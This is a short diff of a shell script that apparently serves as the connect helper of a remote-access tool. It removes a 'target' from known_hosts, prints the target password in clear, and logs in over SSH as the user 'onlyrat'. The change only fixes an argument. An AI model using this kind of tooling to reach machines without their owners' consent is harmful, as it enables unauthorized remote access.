@@ -8,10 +8,11 @@
 # $3 - target password
 
 # remove target from known hosts
-ssh-keygen -f "$1/../.ssh/known_hosts" -R "$1"
+ssh-keygen -f "$1/../.ssh/known_hosts" -R "$2"
 
 # display password for user ease of access
 echo target password is "$3"
+echo 
 
 # connect to target and add it to hosts
 ssh onlyrat@$2
